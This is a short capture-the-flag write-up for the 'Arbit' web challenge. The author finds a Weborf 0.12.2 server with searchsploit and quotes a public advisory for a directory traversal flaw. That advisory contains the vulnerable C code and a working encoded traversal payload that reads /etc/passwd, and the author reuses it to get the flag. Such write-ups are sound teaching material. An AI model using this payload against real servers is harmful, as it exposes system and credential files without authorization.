---
title: "Arbit - GuidePoint-Security-Oct27 2022"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "path-traversal", "arbit", "lfi", "web-exploitation", "guidepoint-security-oct27"]
summary: "In this challenge, we can spawn a docker instance:"
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/GuidePoint-Security-Oct27-2022/Web/Arbit/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/GuidePoint-Security-Oct27-2022/Web/Arbit/README.md"
ctf:
  name: "GuidePoint-Security-Oct27"
  year: 2022
  challenge: "Arbit"
---

## Source

- **CTF:** GuidePoint-Security-Oct27 2022
- **Challenge:** Arbit
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/GuidePoint-Security-Oct27-2022/Web/Arbit/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/GuidePoint-Security-Oct27-2022/Web/Arbit/README.md>

---
# Arbit

## Overview

- Overall difficulty for me: Very easy

**In this challenge, we can spawn a docker instance:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027081634.png)

## Find the flag

**Home page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027081732.png)

**Hmm... `Weborf/0.12.2`. Let's search for public exploit via `searchsploit`:**
```
┌──(root🌸siunam)-[~/ctf/GuidePoint-Security-Oct27-2022/Web/Arbit]
└─# searchsploit Weborf
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
weborf 0.12.2 - Directory Traversal                                  | linux/remote/14925.txt
[...]                                                                |
--------------------------------------------------------------------- ---------------------------------
```

**Oh! It's vulnerable to Directory Traversal. Let's mirror that txt file:**
```
┌──(root🌸siunam)-[~/ctf/GuidePoint-Security-Oct27-2022/Web/Arbit]
└─# searchsploit -m 14925
```

**14925.txt:**
```
Title: Weborf httpd <= 0.12.2 Directory Traversal Vulnerability
Date: Sep 6, 2010
Author:	Rew
Link: http://galileo.dmi.unict.it/wiki/weborf/doku.php
Version: 0.12.2
Tested On: Debian 5
CVE: N/A

=============================================================

Weborf httpd <= 0.12.2 suffers a directory traversal
vulnerability.  This vulnerability could allow
attackers to read arbitrary files and hak th3 plan3t.

instance.c : line 240-244
------------------------------
void modURL(char* url) {
    //Prevents the use of .. to access the whole filesystem  <-- ORLY?
    strReplace(url,"../",'\0');

    replaceEscape(url);
------------------------------

Exploit: GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

==============================================================
```

**Let's copy and paste that payload!**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027082137.png)

We found the flag!

# Conclusion

What we've learned:

1. Exploiting Weborf 0.12.2 Directory Traversal
